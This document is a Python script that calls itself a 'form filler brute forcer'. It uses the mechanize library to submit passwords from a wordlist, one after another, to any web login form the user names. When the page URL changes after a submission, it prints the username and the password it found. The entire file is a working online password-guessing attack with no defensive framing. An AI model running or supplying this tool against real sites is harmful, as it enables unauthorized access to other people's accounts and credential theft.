import mechanize
import os
flag = 0
def process(number):
    if number == 1 :
        return "    \t\t\tcracking [|] "
    elif number == 3 :
        return "    \t\t\tcracking [/] "
    elif number == 5 :
        return "    \t\t\tcracking [-] "
    elif number == 7 :
        return "    \t\t\tcracking [\] "

def banner():
    print("#######################################################################################")
    print("#             _____ ___  ____  __  __   _____ ___ _     _     _____ ____              #")
    print("#            |  ___/ _ \|  _ \|  \/  | |  ___|_ _| |   | |   | ____|  _ \             #")
    print("#            | |_ | | | | |_) | |\/| | | |_   | || |   | |   |  _| | |_) |            #")
    print("#            |  _|| |_| |  _ <| |  | | |  _|  | || |___| |___| |___|  _ <             #")
    print("#            |_|   \___/|_| \_\_|  |_| |_|   |___|_____|_____|_____|_| \_\            #")
    print("#                                                                                     #")
    print("#                                     BRUTE FORCER                                    #")
    print("#                                                                                     #")
    print("#                                 AUTHOR  : D4RK M4TT3R                               #")
    print("#                                 VERSION : 1.0                                       #")
    print("#                                 DATE    : 14/2/2020                                 #")
    print("#                                 TIME    : 2:52 AM                                   #")
    print("#######################################################################################")

b = mechanize.Browser()
os.system("clear")
banner()
url = input("\nEnter the url with page having the login form : ")

username = input("Enter a Username : ")


passlist = input("Enter your passwords file path : ")
try :
    passlist = open(passlist, "r")
except :
    print ("\nPassword list Not Found !")
    quit()


uname = input("Enter the username field name : ")
psswd = input ("Enter the password field name : ")

i = 0
for password in passlist:
    if (i >= 7) :
        i = 0
    i += 1
    print(process(i) , end="\r")
    response = b.open(url)
    b.select_form(nr=0)
    b.form[uname.strip()] = username.strip()
    b.form[psswd.strip()] = password.strip()
    b.method = "POST"
    response = b.submit()
    if response.geturl() != url:
        print ("     \t\t\tCracked [+] \nUsername : " + username.strip() + "\nPassword : " + password.strip())
        flag = 1
        break
if (flag == 0 ):
    print("     \t\t\tERROR [x]    \nCant find any matches ! ")
    quit()



